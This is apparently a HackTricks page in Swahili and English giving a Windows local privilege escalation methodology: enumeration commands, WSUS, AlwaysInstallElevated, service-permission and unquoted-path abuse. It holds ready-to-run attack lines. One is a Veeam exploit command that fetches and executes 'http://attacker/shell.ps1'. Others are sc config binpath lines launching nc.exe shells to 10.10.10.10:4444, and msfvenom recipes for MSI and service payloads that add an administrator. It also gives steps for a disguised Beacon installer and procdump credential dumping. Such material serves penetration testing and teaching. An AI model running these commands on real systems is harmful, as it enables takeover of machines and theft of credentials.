# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Chombo bora cha kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Ikiwa haufahamu ni nini Windows Access Tokens, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa taarifa zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa haufahamu ni nini integrity levels katika Windows, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Udhibiti wa Usalama wa Windows

Kuna vitu mbalimbali ndani ya Windows vinavyoweza **kuzuia wewe kuorodhesha mfumo**, kuendesha programu za kimtekelezo (executables) au hata **kutambua shughuli zako**. Unapaswa **kusoma** ukurasa ufuatao na **kuorodhesha** mifumo yote ya ulinzi kabla ya kuanza privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes launched through `RAiLaunchAdminProcess` zinaweza kutumiwa vibaya kufikia High IL bila maoni wakati AppInfo secure-path checks zinaporukwa. Angalia mtiririko maalum wa UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## System Info

### Version info enumeration

Angalia ikiwa toleo la Windows lina udhaifu unaojulikana (angalia pia patches zilizowekwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Toleo Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta taarifa za kina kuhusu Microsoft security vulnerabilities. Hifadhidata hii ina zaidi ya 4,700 security vulnerabilities, ikionesha the **massive attack surface** that a Windows environment presents.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Kwenye mashine, kwa taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info yoyote iliyohifadhiwa katika env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuiwasha hapa: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline za PowerShell yanarekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri, na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya output yanaweza kutokurekodiwa.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwenye logi za PowersShell, unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na yaliyomo yote ya utekelezaji wa script inakusanywa, ikihakikisha kwamba kila block of code imeandikishwa wakati inapoendeshwa. Mchakato huu huhifadhi audit trail kamili ya kila shughuli, muhimu kwa forensics na kwa kuchambua malicious behavior. Kwa kurekodi shughuli zote wakati wa utekelezaji, taarifa za kina kuhusu mchakato zinapatikana.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya Script Block yanaweza kupatikana katika Windows Event Viewer kwa njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Intaneti
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kudhoofisha mfumo ikiwa sasisho hazitaombwa kwa kutumia http**S** bali http.

Unaanza kwa kukagua ikiwa mtandao unatumia sasisho la WSUS lisilo la SSL kwa kuendesha amri ifuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au yafuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ikiwa unapata jibu kama moja ya hizi:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

Ili kukuza udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Hizi ni MiTM weaponized exploits scripts za kuingiza 'bandia' updates katika trafiki ya WSUS isiyo-SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kwa msingi, hii ndiyo kasoro ambayo bug hii inautumia:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Unaweza kutumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara itakaporuhusiwa).

## Auto-Updaters za Wahusika wa Tatu na Agent IPC (local privesc)

Wakala wengi wa ki-enterprise hutoa uso wa localhost IPC na chaneli ya masasisho yenye ruhusa. Ikiwa usajili unaweza kulazimishwa kwenda kwenye server ya mshambuliaji na updater inamwamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kusambaza MSI yenye madhara ambayo huduma ya SYSTEM itaweka. Angalia mbinu jumla (inayotokana na mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` inatoa huduma ya localhost kwenye **TCP/9401** inayosindika ujumbe unaodhibitiwa na mshambuliaji, ikiruhusu amri za hiari kama **NT AUTHORITY\SYSTEM**.

- **Recon**: thibitisha listener na version, kwa mfano, `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika kwenye saraka ileile, kisha chochea payload ya SYSTEM kupitia socket ya ndani:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma inatekeleza amri kama SYSTEM.

## KrbRelayUp

Kuna udhaifu wa **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya yanajumuisha mazingira ambapo **LDAP signing is not enforced,** watumiaji wana **self-rights** zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba haya **mahitaji** yanatimizwa kwa kutumia **mipangilio ya chaguo-msingi**.

Pata **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa habari zaidi kuhusu mtiririko wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** rejista hizi 2 zikiwa **enabled** (value is **0x1**), basi watumiaji wenye ruhusa yoyote wanaweza **install** (execute) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una kikao cha meterpreter unaweza kuendesha kiotomatiki mbinu hii ukitumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa Windows MSI binary ili kupandisha ruhusa. Skripti hii inaandika installer ya MSI iliyotayarishwa mapema ambayo itauliza kuongeza mtumiaji/kikundi (kwa hivyo utahitaji upatikanaji wa GIU):
```
Write-UserAddMSI
```
Endesha tu binary iliyoundwa ili kupandisha vibali.

### MSI Wrapper

Soma funzo hili ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka unaweza kuzungusha faili ya "**.bat**" ikiwa unataka **tu** kutekeleza **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na bonyeza **Next**.
- Mpa mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa mahali, chagua **place solution and project in the same directory**, na bonyeza **Create**.
- Endelea kubonyeza **Next** hadi ufikie hatua ya 3 ya 4 (choose files to include). Bonyeza **Add** na chagua Beacon payload uliyotengeneza. Kisha bonyeza **Finish**.
- Chagua mradi wa **AlwaysPrivesc** katika **Solution Explorer** na katika **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna properties nyingine unaweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya app iliyosakinishwa ionekane halali zaidi.
- Bofya kulia mradi na chagua **View > Custom Actions**.
- Bofya kulia **Install** na chagua **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. Hii itahakikisha kuwa beacon payload inatekelezwa mara installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Hatimaye, **build it**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **installation** ya `.msi` file yenye madhumuni mabaya kwa **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili ku-exploit udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Wachunguzi

### Mipangilio ya Ukaguzi

Mipangilio hii zinaamua nini **kinachorekodiwa**, kwa hivyo unapaswa kulipa umakini
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua wapi logs zinatumwa
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa eneo**, ikihakikisha kwamba kila nywila ni **ya kipekee, iliyopangwa nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinaweza kupatikana tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, kuwaruhusu kuona nywila za admin za eneo ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewezeshwa, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Local Security Authority (LSA) ili **kuzuia** jaribio la michakato isiyoaminika la **kusoma kumbukumbu yake** au kuingiza msimbo, na hivyo kuimarisha usalama wa mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa kwenye **Windows 10**. Kusudi lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** zinathibitishwa na **Local Security Authority** (LSA) na zinatumiwa na vipengele vya mfumo wa uendeshaji. Wakati data ya kuingia ya mtumiaji inathibitishwa na registered security package, domain credentials za mtumiaji kwa kawaida huanzishwa.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji na Makundi

### Orodhesha Watumiaji na Makundi

Unapaswa kuangalia ikiwa kuna makundi unayoyajumuisha yenye ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vyenye mamlaka

Iwapo wewe **uko katika kundi fulani lenye mamlaka unaweza kuwa na uwezo wa escalate privileges**. Jifunze kuhusu vikundi vyenye mamlaka na jinsi ya kuvitumia vibaya ili escalate privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu ni nini **token** katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu tokens zenye kuvutia** na jinsi ya kuvitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nywila
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

Kwanza kabisa, unapoorodhesha processes, **angalia passwords ndani ya command line ya process**.\
Angalia kama unaweza **overwrite some binary running** au kama una **write permissions** za binary folder ili kuchukua fursa ya [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** kuwa zinaendeshwa; unaweza kuzitumia ku-escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kukagua ruhusa za binaries za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kukagua ruhusa za folda za binaries za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Uchimbaji wa Memory Password

Unaweza kuunda memory dump ya mchakato unaoendeshwa kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **credentials in clear text in memory**, jaribu kufanya dump ya memory na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazoendesha kama SYSTEM zinaweza kumruhusu mtumiaji kuzindua CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bonyeza "Click to open Command Prompt"

## Huduma

Service Triggers zinawezesha Windows kuanzisha service wakati masharti fulani yanapotokea (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Hata bila haki za SERVICE_START mara nyingi unaweza kuanzisha services zenye ruhusa kwa kuwasha triggers zao. Angalia mbinu za kuorodhesha na uanzishaji hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za huduma
```bash
sc qc <service_name>
```
Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kukagua ngazi ya ruhusa inayohitajika kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kukagua ikiwa "Authenticated Users" wanaweza kubadilisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha huduma

Ikiwa unapata kosa hili (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Kumbuka kwamba service upnphost inategemea SSDPSRV ili ifanye kazi (kwa XP SP1)**

**Njia mbadala nyingine ya tatizo hili ni kuendesha:**
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya huduma**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kubadilisha binary inayotekelezwa ya service. Ili kubadilisha na kutekeleza **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha upya huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Madaraka yanaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kurekebisha upya binary ya service.
- **WRITE_DAC**: Inaruhusu kurekebishwa kwa ruhusa, ikikufanya uweze kubadilisha usanidi wa service.
- **WRITE_OWNER**: Inaruhusu kupata umiliki na kurekebisha ruhusa.
- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha usanidi wa service.

Kwa kugundua na kuutumia udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za binaries za service

**Angalia kama unaweza kubadilisha binary inayotekelezwa na service** au ikiwa una **ruhusa za kuandika kwenye folda** ambapo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (si katika system32) na ukagua ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kubadilisha rejista za huduma

Unapaswa kukagua kama unaweza kubadilisha rejista yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako kwenye **rejista** ya huduma kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kukaguliwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndiyo, binary inayotekelezwa na huduma inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Ruhusa za AppendData/AddSubdirectory kwenye rejista ya Services

Ikiwa una ruhusa hii kwenye rejista, hii inamaanisha **unaweza kuunda rejista ndogo kutoka kwa hii**. Kwa huduma za Windows, hii ni **ya kutosha kutekeleza msimbo wowote:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Njia za Service zisizo na nukuu

Ikiwa njia ya executable haiko ndani ya nukuu, Windows itajaribu kutekeleza kila sehemu kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha njia zote za huduma zisizo na nukuu, ukiziondoa zile zinazomilikiwa na huduma za Windows zilizojengwa:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na exploit** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kwa mkono service binary kwa metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejesho

Windows inaruhusu watumiaji kutaja vitendo vinavyotakiwa kuchukuliwa ikiwa huduma itashindwa. Kipengele hiki kinaweza kusanidiwa kuonyesha binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kuwa uwezekano. Maelezo zaidi yanapatikana katika [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Programu

### Programu zilizowekwa

Angalia **permissions of the binaries** (labda unaweza ku-overwrite moja na escalate privileges) na **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia kama unaweza kubadilisha baadhi ya config file ili kusoma faili maalum au kama unaweza kubadilisha binary itakayotekelezwa na akaunti ya Administrator (schedtasks).

Njia ya kupata ruhusa dhaifu za folda/faili katika mfumo ni kwa kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
